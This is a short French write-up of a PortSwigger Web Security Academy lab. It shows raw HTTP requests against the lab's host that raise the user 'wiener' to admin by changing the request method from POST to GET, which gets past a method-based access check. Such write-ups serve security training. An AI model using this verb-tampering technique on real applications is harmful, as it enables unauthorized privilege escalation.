# Lab

https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

## Solution

Le lab nous permet de nous connecter avec le compte administrateur pour nous familiariser avec le panel d'admin.

Sur ce panel on peut upgrade les roles des utilisateurs via cette requête:

```http
POST /admin-roles HTTP/2
Host: 0a8000d403ddc67282791f94009e0098.web-security-academy.net
Cookie: session=S5WSOrRRBMxvn3Qed7K7wxhgdc8E03cD
Content-Length: 30
Origin: https://0a8000d403ddc67282791f94009e0098.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a8000d403ddc67282791f94009e0098.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

username=wiener&action=upgrade
```

Ici ça fonctionne puisqu'on est connecté avec le compte admin.

Si on se déconnecte et qu'on essaie de faire la même requête avec le compte `wiener` on a l'erreur `Access denied`.

En revanche, si on change la méthode HTTP de `POST` à `GET` on a accès à la fonctionnalité d'upgrade des rôles.

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a8000d403ddc67282791f94009e0098.web-security-academy.net
Cookie: session=Og0ZQzO1GC1NwOpxqsTSupvYtQiqbfz6
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://0a8000d403ddc67282791f94009e0098.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0a8000d403ddc67282791f94009e0098.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```